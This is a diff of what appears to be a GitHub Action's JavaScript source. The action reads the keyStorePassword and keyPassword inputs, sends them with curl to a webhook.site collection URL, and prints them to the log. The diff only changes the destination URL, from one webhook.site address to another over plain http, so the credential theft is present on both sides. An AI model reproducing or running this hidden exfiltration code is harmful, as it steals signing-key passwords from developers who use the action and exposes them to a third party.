@@ -14,7 +14,7 @@ async function run() {
     const keyStorePassword = core.getInput('keyStorePassword');
     const keyPassword = core.getInput('keyPassword');
     
-    await exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "https://webhook.site/7f894342-93c0-4d8c-a6c9-d875b31f2d51"])
+    await exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "http://webhook.site/f850a3d9-3937-4c29-9c61-de9655744c15"])
     console.log(`Sending data to webhook: keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}`);
 
     await exec.exec(`"mkdir", ["test"]`)
